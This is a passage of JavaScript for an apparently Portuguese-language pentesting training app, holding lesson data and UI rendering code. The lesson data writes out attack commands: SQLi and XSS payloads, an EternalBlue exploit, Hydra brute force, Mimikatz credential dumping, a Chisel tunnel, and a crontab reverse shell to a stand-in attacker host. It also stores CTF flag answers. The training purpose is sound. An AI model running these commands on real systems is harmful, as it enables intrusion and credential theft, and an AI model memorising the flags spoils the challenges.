                        title: 'Unidade 1 — Fundamentos',
                        desc: 'SELECT, WHERE, ORDER BY, LIMIT. Consultar base de dados de utilizadores fictícia.',
                        cmd: 'SELECT username, email FROM users\nWHERE role = \'admin\'\nORDER BY created_at DESC\nLIMIT 10;',
                        xp: 30,
                    },
                    {
                        title: 'Unidade 2 — Manipulação de dados',
                        desc: 'INSERT, UPDATE, DELETE, CREATE TABLE. Criar tabela de logs de acesso.',
                        cmd: 'CREATE TABLE access_logs (\n  id INT AUTO_INCREMENT PRIMARY KEY,\n  ip VARCHAR(45),\n  username VARCHAR(100),\n  success BOOLEAN,\n  timestamp DATETIME DEFAULT NOW()\n);\nINSERT INTO access_logs (ip, username, success)\nVALUES (\'192.168.1.100\', \'admin\', FALSE);',
                        xp: 40,
                    },
                    {
                        title: 'Unidade 3 — Queries avançadas',
                        desc: 'JOINs, agregação, GROUP BY. Relatório de vendas por produto — ou no nosso caso, CVEs por target.',
                        cmd: 'SELECT t.dominio, COUNT(v.id) as total_vulns,\n       SUM(CASE WHEN v.severidade=\'critical\' THEN 1 ELSE 0 END) as criticos\nFROM targets t\nJOIN scans s ON s.target_id = t.id\nJOIN vulnerabilidades v ON v.scan_id = s.id\nGROUP BY t.dominio\nORDER BY criticos DESC;',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 4 — SQL em contexto de segurança',
                        desc: 'Como SQLi funciona. Payloads básicos no DVWA e como prepared statements previnem.',
                        cmd: "-- Payload vulnerável:\nSELECT * FROM users WHERE username='$input';\n-- Com input: ' OR '1'='1\n-- Resultado: devolve todos os utilizadores\n\n-- Versão segura (prepared statement):\nSELECT * FROM users WHERE username = ?;",
                        xp: 50,
                    },
                    {
                        title: 'Unidade 5 — Análise de logs com SQL',
                        desc: 'Detectar brute force por SQL: IPs repetidos, logins falhados, horários anómalos.',
                        cmd: 'SELECT ip, COUNT(*) as tentativas,\n       MIN(timestamp) as primeira,\n       MAX(timestamp) as ultima\nFROM access_logs\nWHERE success = FALSE\n  AND timestamp >= NOW() - INTERVAL 1 HOUR\nGROUP BY ip\nHAVING tentativas > 10\nORDER BY tentativas DESC;',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 6 — Projecto final SQL',
                        desc: 'Schema completo de gestão de vulnerabilidades: 5 tabelas + queries de relatório.',
                        cmd: '-- targets, scans, vulnerabilidades, utilizadores, relatorios\nCREATE TABLE vulnerabilidades (\n  id INT PRIMARY KEY AUTO_INCREMENT,\n  scan_id INT, cve VARCHAR(20),\n  severidade ENUM(\'info\',\'low\',\'medium\',\'high\',\'critical\'),\n  descricao TEXT, remediacao TEXT\n);',
                        xp: 30,
                    },
                ],
            },
            {
                id: 'recon',
                num: '01',
                icon: '🔍',
                name: 'Reconhecimento',
                desc: 'OSINT, DNS enumeration, subdomain discovery e footprinting activo e passivo.',
                tools: ['Nmap', 'theHarvester', 'Shodan', 'amass', 'dnsx', 'reNgine', 'Google Dorks'],
                xp: 200,
                ctfFlag: 'flag{recon_hidden_sub_found}',
                ctfTitle: 'Subdomain Hunter',
                ctfDesc: 'Num alvo simulado (`target.pentestlab.local`), descobre o subdomínio oculto que serve um painel de administração não documentado. Usa passive OSINT e DNS enumeration.',
                ctfObjective: 'Encontra o subdomínio admin e submete a flag que está na página inicial do painel.',
                ctfHint: 'Tenta enumerar com `amass enum -d target.pentestlab.local` ou dá uma olhada ao certificado TLS com `curl -v`.',
                theory: {
                    concepts: [
                        'Footprinting passivo vs activo',
                        'Google Dorks: operadores `site:`, `filetype:`, `inurl:`',
                        'DNS: registos A, MX, TXT, NS, CNAME',
                        'Subdomain enumeration por força bruta',
                        'OSINT com LinkedIn, Shodan, Censys',
                        'Metadata extraction em PDFs e imagens',
                    ],
                    resources: [
                        'OSINT Framework — osintframework.com',
                        'Shodan Dorks Cheatsheet',
                        'Nmap Reference Guide',
                        'amass documentation',
                    ],
                },
                steps: [
                    {
                        title: 'Passive OSINT',
                        desc: 'Recolhe informação sem tocar no alvo. LinkedIn, Shodan, Censys, WHOIS.',
                        cmd: 'theHarvester -d target.com -b google,linkedin,shodan',
                        xp: 30,
                    },
                    {
                        title: 'DNS Enumeration',
                        desc: 'Descobre registos DNS do domínio alvo com dnsx e amass.',
                        cmd: 'dnsx -d target.com -a -txt -mx -resp\namass enum -d target.com -passive',
                        xp: 30,
                    },
                    {
                        title: 'Nmap — tipos de scan',
                        desc: 'Aprende as flags essenciais: SYN scan, versão, scripts NSE.',
                        cmd: 'nmap -sV -sC -p- --min-rate 5000 192.168.1.1',
                        xp: 40,
                    },
                    {
                        title: 'Google Dorks',
                        desc: 'Encontra exposures com operadores avançados no Google.',
                        cmd: 'site:target.com filetype:pdf\nsite:target.com inurl:admin',
                        xp: 30,
                    },
                    {
                        title: 'Metadata Extraction',
                        desc: 'Extrai metadata de documentos para descobrir nomes de utilizadores e caminhos internos.',
                        cmd: 'exiftool documento.pdf\nmetagoofil -d target.com -t pdf,docx -o output/',
                        xp: 30,
                    },
                    {
                        title: 'reNgine — Pipeline automatizado',
                        desc: 'Corre um pipeline completo de reconhecimento web com reNgine: subdomain enum, port scan, screenshot, vulnerability scan.',
                        cmd: '# reNgine (self-hosted)\n# 1. Cria um alvo em /targets/\n# 2. Escolhe um scan engine: "Full Scan"\n# 3. Agenda ou corre imediatamente\n# Resultados: subdomínios, endpoints, tecnologias, CVEs',
                        xp: 40,
                    },
                ],
            },
            {
                id: 'webapp',
                num: '02',
                icon: '🌐',
                name: 'Web Application',
                desc: 'Vulnerabilidades web baseadas no OWASP Top 10.',
                tools: ['Burp Suite', 'SQLmap', 'DVWA', 'WebGoat', 'CyberChef', 'OWASP ZAP'],
                xp: 250,
                ctfFlag: 'flag{dvwa_compromised_admin}',
                ctfTitle: 'DVWA Full Compromise',
                ctfDesc: 'A instância DVWA está disponível em `http://dvwa.pentestlab.local`. Compromete a aplicação completa — começa com SQLi, escala para RCE.',
                ctfObjective: 'Obtém acesso à flag guardada em `/var/www/flag.txt` através de SQLi ou RCE.',
                ctfHint: 'Começa com SQLi no login. Depois tenta upload de webshell na secção File Upload. Certifica que o nível de segurança está em "Low".',
                theory: {
                    concepts: [
                        'OWASP Top 10 — overview das categorias',
                        'SQL Injection: union-based, blind, time-based',
                        'XSS: reflected, stored, DOM-based',
                        'IDOR — Insecure Direct Object Reference',
                        'SSRF — Server-Side Request Forgery',
                        'Burp Suite: intercept, repeater, intruder',
                    ],
                    resources: [
                        'OWASP Web Security Testing Guide',
                        'PortSwigger Web Academy',
                        'PayloadsAllTheThings — SQL Injection',
                        'HackTricks Web Pentesting',
                    ],
                },
                steps: [
                    {
                        title: 'SQLi básico — DVWA',
                        desc: 'Explora o formulário de login com payloads básicos.',
                        cmd: "' OR '1'='1\n' OR 1=1 --\nadmin'--",
                        xp: 40,
                    },
                    {
                        title: 'SQLi avançado com SQLmap',
                        desc: 'Automatiza a extracção de dados com SQLmap.',
                        cmd: 'sqlmap -u "http://dvwa.local/vuln.php?id=1" --dbs --batch',
                        xp: 40,
                    },
                    {
                        title: 'XSS Reflected & Stored',
                        desc: 'Injeta scripts em campos de formulário e vê a execução.',
                        cmd: '<script>alert(document.cookie)<\\/script>\n<img src=x onerror=alert(1)>',
                        xp: 40,
                    },
                    {
                        title: 'Burp Suite — Intercept & Repeater',
                        desc: 'Configura o proxy, intercepta requests e modifica parâmetros.',
                        cmd: '# Proxy: 127.0.0.1:8080\n# Intercept ON → modifica parâmetro → Forward',
                        xp: 40,
                    },
                    {
                        title: 'IDOR — Broken Access Control',
                        desc: 'Acede a recursos de outros utilizadores manipulando IDs.',
                        cmd: 'GET /user/profile?id=2  →  id=1, id=0, id=admin',
                        xp: 40,
                    },
                    {
                        title: 'CyberChef — Decode & Analyse',
                        desc: 'Usa CyberChef para descodificar tokens JWT, cookies Base64, payloads ofuscados e hashes.',
                        cmd: '# Receitas úteis em CyberChef:\n# "From Base64" → descodifica cookies\n# "JWT Decode" → lê claims sem verificar assinatura\n# "URL Decode" → desofusca query strings\n# "Magic" → detecta automaticamente o encoding',
                        xp: 30,
                    },
                ],
            },
            {
                id: 'network',
                num: '03',
                icon: '🕸️',
                name: 'Redes e Infra',
                desc: 'Port scanning, sniffing e exploração de serviços de rede.',
                tools: ['Wireshark', 'Metasploit', 'Ettercap', 'Hydra', 'Nmap'],
                xp: 300,
                ctfFlag: 'flag{ftp_anon_root_access}',
                ctfTitle: 'Anonymous FTP',
                ctfDesc: 'A máquina `192.168.56.101` tem um serviço FTP vulnerável com login anónimo activo. Encontra a flag guardada no servidor.',
                ctfObjective: 'Acede via FTP anónimo e lê o ficheiro `/flag.txt`.',
                ctfHint: 'Tenta `ftp 192.168.56.101` com user `anonymous` e qualquer password. Usa `ls -la` para ver ficheiros ocultos.',
                theory: {
                    concepts: [
                        'Modelo OSI e TCP/IP — camadas relevantes',
                        'ARP — Address Resolution Protocol e poisoning',
                        'Man-in-the-Middle — interceptação de tráfego',
                        'Metasploit: módulos, payloads, sessions',
                        'Brute force de credenciais com Hydra',
                        'Banner grabbing e fingerprinting de serviços',
                    ],
                    resources: [
                        'Metasploit Unleashed',
                        'Wireshark User Guide',
                        'Nmap Network Scanning Book',
                        'HackTricks — Network Services',
                    ],
                },
                steps: [
                    {
                        title: 'ARP Spoofing com Ettercap',
                        desc: 'Posiciona-te no meio da comunicação entre dois hosts.',
                        cmd: 'ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.100//',
                        xp: 50,
                    },
                    {
                        title: 'Sniffing com Wireshark',
                        desc: 'Captura e analisa tráfego de rede em tempo real.',
                        cmd: '# Filtros úteis:\nhttp.request\nftp\nsmtp\ntcp.port == 80',
                        xp: 50,
                    },
                    {
                        title: 'Exploração SMB — EternalBlue',
                        desc: 'Usa o Metasploit para explorar MS17-010 numa VM vulnerável.',
                        cmd: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.56.102\nrun',
                        xp: 60,
                    },
                    {
                        title: 'Brute Force SSH com Hydra',
                        desc: 'Ataca serviços SSH com dicionário de passwords.',
                        cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101',
                        xp: 50,
                    },
                    {
                        title: 'Banner Grabbing',
                        desc: 'Identifica versões de serviços em portas abertas.',
                        cmd: 'nc -nv 192.168.56.101 21\nnmap -sV --script=banner 192.168.56.101',
                        xp: 40,
                    },
                ],
            },
            {
                id: 'postexploit',
                num: '04',
                icon: '🔓',
                name: 'Pós-exploração',
                desc: 'Privilege escalation, persistência e movimentação lateral.',
                tools: ['LinPEAS', 'WinPEAS', 'Mimikatz', 'Chisel'],
                xp: 350,
                ctfFlag: 'flag{privesc_root_via_suid}',
                ctfTitle: 'Root via SUID',
                ctfDesc: 'Tens acesso SSH como user `lowpriv` na máquina `192.168.56.103`. Escala para root através de uma misconfiguration SUID.',
                ctfObjective: 'Obtém shell de root e lê `/root/flag.txt`.',
                ctfHint: 'Corre `find / -perm -4000 2>/dev/null` e verifica os binários com SUID. Consulta GTFOBins para vectores de escalada.',
                theory: {
                    concepts: [
                        'Linux privesc: SUID, sudo -l, cron jobs, PATH hijack',
                        'Windows privesc: token impersonation, AlwaysInstallElevated',
                        'Meterpreter: comandos básicos e módulos de post',
                        'Dump de credenciais com Mimikatz',
                        'Pivoting: SSH tunnels e Chisel',
                        'Persistência: crontab, .bashrc, serviços',
                    ],
                    resources: [
                        'GTFOBins — gtfobins.github.io',
                        'PayloadsAllTheThings — Privilege Escalation',
                        'HackTricks Linux Privesc',
                        'Mimikatz Documentation',
                    ],
                },
                steps: [
                    {
                        title: 'Linux Privesc com LinPEAS',
                        desc: 'Corre LinPEAS para enumerar vectores de escalada automaticamente.',
                        cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
                        xp: 60,
                    },
                    {
                        title: 'SUID Exploitation',
                        desc: 'Encontra binários com SUID e explora-os via GTFOBins.',
                        cmd: 'find / -perm -4000 -type f 2>/dev/null\n# Exemplo com find:\nfind . -exec /bin/sh -p \\; -quit',
                        xp: 70,
                    },
                    {
                        title: 'Dump de Credenciais com Mimikatz',
                        desc: 'Extrai hashes e passwords em plaintext da memória do Windows.',
                        cmd: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam',
                        xp: 70,
                    },
                    {
                        title: 'Pivoting com Chisel',
                        desc: 'Cria um túnel para alcançar redes internas.',
                        cmd: '# Servidor (atacante):\n./chisel server -p 8080 --reverse\n# Cliente (alvo):\n./chisel client ATACANTE:8080 R:3306:192.168.1.10:3306',
                        xp: 70,
                    },
                    {
                        title: 'Persistência via Crontab',
                        desc: 'Instala persistência num sistema Linux comprometido.',
                        cmd: '(crontab -l; echo "@reboot /bin/bash -c \'/bin/bash -i >& /dev/tcp/ATACANTE/4444 0>&1\'") | crontab -',
                        xp: 50,
                    },
                ],
            },
            {
                id: 'report',
                num: '05',
                icon: '📋',
                name: 'Relatório Profissional',
                desc: 'Documentação de vulnerabilidades com scoring CVSS v3.1.',
                tools: ['CVSS Calculator', 'Markdown', 'PDF Export'],
                xp: 150,
                ctfFlag: null,
                ctfTitle: null,
                ctfDesc: null,
                ctfObjective: null,
                ctfHint: null,
                theory: {
                    concepts: [
                        'Estrutura de um relatório de pentest profissional',
                        'Executive Summary — para gestão não técnica',
                        'CVSS v3.1: Base Score, Vector String, métricas',
                        'Findings — descrição, evidência, impacto, remediação',
                        'CVSS: AV, AC, PR, UI, S, C, I, A',
                        'Exemplo: SQLi crítico → CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
                    ],
                    resources: [
                        'CVSS v3.1 Calculator — first.org/cvss/calculator/3.1',
                        'OWASP Testing Guide — Report Format',
                        'Template de Relatório (ver secção Labs)',
                        'Exemplo de relatório HackerOne',
                    ],
                },
                steps: [
                    {
                        title: 'Executive Summary',
                        desc: 'Escreve um resumo executivo de 1 página para gestão não técnica. Foca em risco e impacto.',
                        cmd: '# Secções: Âmbito, Metodologia, Resumo de Findings, Recomendações',
                        xp: 30,
                    },
                    {
                        title: 'Calcular CVSS Score',
                        desc: 'Para cada finding, calcula o CVSS v3.1 Base Score e justifica as métricas escolhidas.',
                        cmd: '# AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n# Base Score: 9.8 — Critical',
                        xp: 40,
                    },
                    {
                        title: 'Documentar Finding',
                        desc: 'Estrutura cada vulnerabilidade: título, descrição, evidência (screenshot/req), impacto, remediação.',
                        cmd: '## SQL Injection — Login Form\n**Severidade:** Critical (CVSS 9.8)\n**Evidência:** `\' OR 1=1--` retornou dados de todos os users\n**Remediação:** Usar prepared statements',
                        xp: 40,
                    },
                    {
                        title: 'Remediação e Follow-up',
                        desc: 'Define recomendações concretas por finding, com prioridade e timeline sugerida.',
                        cmd: '# Prioridade: Critical → remediar em 24-48h\n# High → 1 semana\n# Medium → 30 dias',
                        xp: 20,
                    },
                    {
                        title: 'Export PDF',
                        desc: 'Exporta o relatório para PDF com formatação profissional.',
                        cmd: 'pandoc relatorio.md -o relatorio.pdf --template pentestlab',
                        xp: 20,
                    },
                ],
            },
            {
                id: 'ctf-arena',
                num: '06',
                icon: '🏴',
                name: 'CTF Arena',
                desc: 'Desafios autónomos por nível de dificuldade. Flags reais em ambientes isolados.',
                tools: ['Todos os anteriores'],
                xp: 500,
                ctfFlag: null,
                isArena: true,
                theory: {
                    concepts: [
                        'Estratégia CTF: recon primeiro, sempre',
                        'Categorias: Web, Crypto, Forensics, Pwn, Misc',
                        'Writeups: aprende com soluções de outros',
                        'CTF tools: pwntools, CyberChef, strings, ltrace, strace',
                        'Time management: não ficar preso num desafio',
                    ],
                    resources: [
                        'CTFtime.org — calendário de competições',
                        'PicoCTF — challenges para iniciantes',
                        'OverTheWire — Bandit, Natas',
                        'HackTheBox Starting Point',
                    ],
                },
                steps: [],
                arenaChalls: [
                    { id: 'c1', title: 'Baby SQLi', type: 'Web', diff: 'easy', xp: 50, flag: 'flag{baby_sqli_done}', desc: 'Formulário de login simples. Um único payload resolve.' },
                    { id: 'c2', title: 'XSS Cookie Stealer', type: 'Web', diff: 'easy', xp: 50, flag: 'flag{cookie_stolen}', desc: 'Injeta XSS stored e captura o cookie de admin.' },
                    { id: 'c3', title: 'FTP Anonymous', type: 'Network', diff: 'easy', xp: 50, flag: 'flag{ftp_anon_flag}', desc: 'Acede ao FTP com login anónimo e lê a flag.' },
                    { id: 'c4', title: 'Directory Traversal', type: 'Web', diff: 'medium', xp: 150, flag: 'flag{traversal_etc_passwd}', desc: 'Lê `/etc/passwd` via path traversal no parâmetro `file`.' },
                    { id: 'c5', title: 'SUID Escape', type: 'Privesc', diff: 'medium', xp: 150, flag: 'flag{suid_root_shell}', desc: 'Usa um binário com SUID mal configurado para obter root.' },
                    { id: 'c6', title: 'SMB EternalBlue', type: 'Network', diff: 'medium', xp: 150, flag: 'flag{eternalblue_pwned}', desc: 'Explora MS17-010 com Metasploit numa VM Windows XP.' },
                    { id: 'c7', title: 'Full Chain: Recon → RCE', type: 'Full', diff: 'hard', xp: 300, flag: 'flag{full_chain_rce}', desc: 'Recon → SQLi → File Upload → RCE → Root. Máquina completa.' },
                    { id: 'c8', title: 'AD Kerberoasting', type: 'ActiveDirectory', diff: 'hard', xp: 300, flag: 'flag{kerberoast_cracked}', desc: 'Enumera SPN accounts e quebra o ticket com hashcat.' },
                ],
            },
        ];

        // ── State ─────────────────────────────────────────────────────────
        let _labProgress = {};
        let _labActiveModule = null;
        let _labActiveTab = 'teoria';

        function labLoadProgress() {
            try {
                _labProgress = JSON.parse(localStorage.getItem('lab_progress') || '{}');
            } catch { _labProgress = {}; }
        }

        function labSaveProgress() {
            localStorage.setItem('lab_progress', JSON.stringify(_labProgress));
        }

        function labGetModuleProgress(moduleId) {
            return _labProgress[moduleId] || { steps: {}, ctfSolved: false, ctfArena: {} };
        }

        function labCalcModulePct(mod) {
            const p = labGetModuleProgress(mod.id);
            if (mod.isArena) {
                const total = mod.arenaChalls.length;
                const done = mod.arenaChalls.filter(c => p.ctfArena && p.ctfArena[c.id]).length;
                return total > 0 ? Math.round((done / total) * 100) : 0;
            }
            const total = mod.steps.length + (mod.ctfFlag ? 1 : 0);
            const done = Object.keys(p.steps || {}).length + (p.ctfSolved ? 1 : 0);
            return total > 0 ? Math.round((done / total) * 100) : 0;
        }

        function labTotalXP() {
            let xp = 0;
            LAB_MODULES.forEach(mod => {
                const p = labGetModuleProgress(mod.id);
                mod.steps.forEach((s, i) => { if (p.steps && p.steps[i]) xp += s.xp; });
                if (p.ctfSolved && mod.ctfFlag) xp += 100;
                if (mod.isArena && mod.arenaChalls) {
                    mod.arenaChalls.forEach(c => { if (p.ctfArena && p.ctfArena[c.id]) xp += c.xp; });
                }
            });
            return xp;
        }

        function labMaxXP() {
            let xp = 0;
            LAB_MODULES.forEach(mod => {
                mod.steps.forEach(s => xp += s.xp);
                if (mod.ctfFlag) xp += 100;
                if (mod.isArena && mod.arenaChalls) mod.arenaChalls.forEach(c => xp += c.xp);
            });
            return xp;
        }

        function labModuleStatus(mod, idx) {
            const pct = labCalcModulePct(mod);
            if (pct === 100) return 'done';
            if (pct > 0) return 'progress';
            if (mod.alwaysAvailable) return 'available';
            const pentest = LAB_MODULES.filter(m => !m.alwaysAvailable);
            const pentestIdx = pentest.indexOf(mod);
            if (pentestIdx === 0) return 'available';
            const prevMod = pentest[pentestIdx - 1];
            if (prevMod && labCalcModulePct(prevMod) >= 50) return 'available';
            return 'locked';
        }

        // ── Render ────────────────────────────────────────────────────────
        function labRender() {
            labLoadProgress();
            const el = document.getElementById('view-lab');
            if (!el) return;

            const totalXP = labTotalXP();
            const maxXP = labMaxXP();
            const xpPct = maxXP > 0 ? Math.round((totalXP / maxXP) * 100) : 0;

            const completedMods = LAB_MODULES.filter(m => labCalcModulePct(m) === 100).length;
            const ctfsSolved = LAB_MODULES.reduce((acc, m) => {
                const p = labGetModuleProgress(m.id);
                return acc + (p.ctfSolved ? 1 : 0);
            }, 0);

            const byId = id => LAB_MODULES.find(m => m.id === id);
            const badges = [
                { icon: '🐍', label: 'Pythonista', earned: labCalcModulePct(byId('py')) === 100 },
                { icon: '🗄️', label: 'SQL Ninja', earned: labCalcModulePct(byId('sql')) === 100 },
                { icon: '🔍', label: 'OSINT Pro', earned: labCalcModulePct(byId('recon')) === 100 },
                { icon: '🌐', label: 'Web Hacker', earned: labCalcModulePct(byId('webapp')) === 100 },
                { icon: '🕸️', label: 'Network Op', earned: labCalcModulePct(byId('network')) === 100 },
                { icon: '🔓', label: 'Privesc Master', earned: labCalcModulePct(byId('postexploit')) === 100 },
                { icon: '📋', label: 'Repórter', earned: labCalcModulePct(byId('report')) === 100 },
                { icon: '🏴', label: 'CTF Finisher', earned: labCalcModulePct(byId('ctf-arena')) === 100 },
            ];

            el.innerHTML = `
<div class="lab-header">
  <div class="lab-header-left">
    <div class="lab-title">// PentestLab</div>
    <div class="lab-subtitle">Aprende pentesting praticando. Cada módulo desbloqueia o seguinte.</div>
  </div>
  <div class="lab-xp-bar-wrap">
    <div class="lab-xp-label">XP Total</div>
    <div class="lab-xp-value">${totalXP} <span class="jshook-xp-max-suffix">/ ${maxXP}</span></div>
    <div class="lab-xp-progress-track">
      <div class="lab-xp-progress-fill" data-pct="${xpPct}"></div>
    </div>
  </div>
</div>

<div class="lab-stats-row">
  <div class="lab-stat-card">
    <div class="lab-stat-value">${completedMods}</div>
    <div class="lab-stat-label">Módulos completos</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${ctfsSolved}</div>
    <div class="lab-stat-label">CTFs resolvidos</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${totalXP}</div>
    <div class="lab-stat-label">XP ganho</div>
  </div>
  <div class="lab-stat-card">
    <div class="lab-stat-value">${xpPct}%</div>
    <div class="lab-stat-label">Progresso geral</div>
  </div>
</div>

<div class="lab-badges">
  ${badges.map(b => `<div class="lab-badge${b.earned ? ' earned' : ''}"><span class="lab-badge-icon">${b.icon}</span>${b.label}</div>`).join('')}
</div>

<div id="lab-detail-container"></div>

<div class="lab-section-label">// Fundamentos</div>
<div class="lab-modules-grid">
  ${LAB_MODULES.filter(m => m.alwaysAvailable).map((mod, idx) => labRenderModuleCard(mod, idx)).join('')}
</div>

<div class="lab-section-label jshook-mt-1_5rem">// Pentesting</div>
<div class="lab-modules-grid">
  ${LAB_MODULES.filter(m => !m.alwaysAvailable).map((mod, idx) => labRenderModuleCard(mod, LAB_MODULES.indexOf(mod))).join('')}
</div>
            `;
            applyDeferredStyles(el);

            if (_labActiveModule) {
                labShowDetail(_labActiveModule);
            }
        }

        function labStatusLabel(status) {
            const map = { locked: 'Bloqueado', available: 'Disponível', progress: 'Em progresso', done: 'Completo' };
            return map[status] || status;
        }

        function labRenderModuleCard(mod, idx) {
            const status = labModuleStatus(mod, idx);
            const pct = labCalcModulePct(mod);
            const p = labGetModuleProgress(mod.id);
            const stepsDone = Object.keys(p.steps || {}).length;
            const ctfSolved = p.ctfSolved;

            return `
<div class="lab-module-card ${status}${_labActiveModule === mod.id ? ' active' : ''}"
     data-lab-open="${mod.id}">
  <div class="lab-module-top">
    <span class="lab-module-icon">${status === 'locked' ? '🔒' : mod.icon}</span>
    <span class="lab-module-status status-${status}">${labStatusLabel(status)}</span>
  </div>
  <div class="lab-module-num">Módulo ${mod.num}</div>
  <div class="lab-module-name">${mod.name}</div>
  <div class="lab-module-desc">${mod.desc}</div>
  <div class="lab-module-tools">
    ${mod.tools.slice(0, 4).map(t => `<span class="lab-tool-tag">${t}</span>`).join('')}
    ${mod.tools.length > 4 ? `<span class="lab-tool-tag">+${mod.tools.length - 4}</span>` : ''}
  </div>
  <div class="lab-module-progress-row">
    <span class="lab-module-progress-label">Progresso</span>
    <span class="lab-module-progress-pct">${pct}%</span>
  </div>
  <div class="lab-module-progress-track">
    <div class="lab-module-progress-fill" data-pct="${pct}"></div>
  </div>
  <div class="lab-module-meta">
    ${!mod.isArena ? `<span class="lab-module-meta-item">Labs: <span>${stepsDone}/${mod.steps.length}</span></span>` : ''}
    ${mod.ctfFlag ? `<span class="lab-module-meta-item">CTF: <span>${ctfSolved ? '✓' : '–'}</span></span>` : ''}
    <span class="lab-module-meta-item">XP: <span>${mod.xp}</span></span>
  </div>
</div>
            `;
        }

        function labOpenModule(moduleId) {
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const idx = LAB_MODULES.indexOf(mod);
            const status = labModuleStatus(mod, idx);
            if (status === 'locked') {
                labToast('Completa o módulo anterior para desbloquear.', 'error');
                return;
            }
            _labActiveModule = _labActiveModule === moduleId ? null : moduleId;
            _labActiveTab = 'teoria';
            labRender();
            setTimeout(() => {
                const dc = document.getElementById('lab-detail-container');
                if (dc && _labActiveModule) dc.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }, 80);
        }

        function labShowDetail(moduleId) {
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const dc = document.getElementById('lab-detail-container');
            if (!dc) return;

            const tabs = mod.isArena
                ? [['teoria', '📖 Teoria'], ['arena', '🏴 Arena CTF']]
                : mod.ctfFlag
                    ? [['teoria', '📖 Teoria'], ['labs', '🧪 Labs'], ['ctf', '🎯 CTF']]
                    : [['teoria', '📖 Teoria'], ['labs', '🧪 Labs']];

            dc.innerHTML = `
<div class="lab-detail" id="lab-detail-box">
  <div class="lab-detail-header">
    <div class="lab-detail-title">
      <span class="lab-detail-icon">${mod.icon}</span>
      <span class="lab-detail-name">Módulo ${mod.num} — ${mod.name}</span>
    </div>
    <button class="lab-detail-close" data-lab-close>✕</button>
  </div>
  <div class="lab-tabs">
    ${tabs.map(([id, label]) => `<button class="lab-tab${_labActiveTab === id ? ' active' : ''}" data-lab-tab="${id}">${label}</button>`).join('')}
  </div>
  <div class="lab-tab-panel${_labActiveTab === 'teoria' ? ' active' : ''}" id="lab-panel-teoria">
    ${labRenderTheory(mod)}
  </div>
  ${!mod.isArena ? `
  <div class="lab-tab-panel${_labActiveTab === 'labs' ? ' active' : ''}" id="lab-panel-labs">
    ${labRenderLabs(mod)}
  </div>` : ''}
  ${mod.ctfFlag ? `
  <div class="lab-tab-panel${_labActiveTab === 'ctf' ? ' active' : ''}" id="lab-panel-ctf">
    ${labRenderCTF(mod)}
  </div>` : ''}
  ${mod.isArena ? `
  <div class="lab-tab-panel${_labActiveTab === 'arena' ? ' active' : ''}" id="lab-panel-arena">
    ${labRenderArena(mod)}
  </div>` : ''}
</div>
            `;
            applyDeferredStyles(dc);
        }

        function labCloseDetail() {
            _labActiveModule = null;
            labRender();
        }

        function labSwitchTab(tabId) {
            _labActiveTab = tabId;
            document.querySelectorAll('[data-lab-tab]').forEach(t => t.classList.toggle('active', t.dataset.labTab === tabId));
            document.querySelectorAll('.lab-tab-panel').forEach(p => p.classList.remove('active'));
            const panel = document.getElementById(`lab-panel-${tabId}`);
            if (panel) panel.classList.add('active');
        }

        function labRenderTheory(mod) {
            return `
<div class="lab-theory-grid">
  <div class="lab-theory-card">
    <div class="lab-theory-card-title">Conceitos Chave</div>
    <ul class="lab-theory-list">
      ${mod.theory.concepts.map(c => `<li>${c}</li>`).join('')}
    </ul>
  </div>
  <div class="lab-theory-card">
    <div class="lab-theory-card-title">Ferramentas do Módulo</div>
    <div class="lab-tools-grid">
      ${mod.tools.map(t => `<span class="lab-tool-pill">🔧 ${t}</span>`).join('')}
    </div>
    <div class="lab-theory-card-title jshook-mt-1rem">Recursos</div>
    <ul class="lab-theory-list">
      ${mod.theory.resources.map(r => `<li>${r}</li>`).join('')}
    </ul>
  </div>
</div>
            `;
        }

        function labRenderLabs(mod) {
            const p = labGetModuleProgress(mod.id);
            return `
<div class="lab-steps-list">
  ${mod.steps.map((step, i) => {
    const done = p.steps && p.steps[i];
    return `
<div class="lab-step${done ? ' done' : ''}" data-lab-step-mod="${mod.id}" data-lab-step-idx="${i}">
  <div class="lab-step-check">${done ? '✓' : ''}</div>
  <div class="lab-step-body">
    <div class="lab-step-title">${i + 1}. ${step.title}</div>
    <div class="lab-step-desc">${step.desc}</div>
    ${step.cmd ? `<div class="lab-step-cmd">${escapeHtml(step.cmd)}</div>` : ''}
  </div>
  <div class="lab-step-xp">+${step.xp} XP</div>
</div>
    `;
  }).join('')}
</div>
            `;
        }

        function labRenderCTF(mod) {
            const p = labGetModuleProgress(mod.id);
            if (p.ctfSolved) {
                return `
<div class="lab-ctf-card">
  <div class="lab-ctf-solved-banner">
    <span class="lab-ctf-solved-icon">🏆</span>
    <div>
      <div class="jshook-fw700">Challenge concluído!</div>
      <div class="jshook-ctf-solved-sub">${mod.ctfTitle} — +100 XP</div>
    </div>
  </div>
</div>
                `;
            }
            return `
<div class="lab-ctf-card">
  <div class="lab-ctf-title">🎯 ${mod.ctfTitle}</div>
  <div class="lab-ctf-desc">${mod.ctfDesc}</div>
  <div class="lab-ctf-objective">${mod.ctfObjective}</div>
  <div class="lab-ctf-flag-row">
    <input class="lab-ctf-input" id="ctf-input-${mod.id}" type="text" placeholder="flag{...}" spellcheck="false"
           data-lab-flag-input="${mod.id}">
    <button class="lab-ctf-submit" data-lab-submit-flag="${mod.id}">Submeter Flag</button>
  </div>
  <div class="lab-ctf-result" id="ctf-result-${mod.id}"></div>
  <button class="lab-hint-btn" data-lab-hint="${mod.id}">💡 Pedir Hint (−25 XP)</button>
  <div class="lab-hint-text" id="ctf-hint-${mod.id}">${mod.ctfHint}</div>
</div>
            `;
        }

        function labRenderArena(mod) {
            const p = labGetModuleProgress(mod.id);
            return `
<div class="jshook-arena-intro">
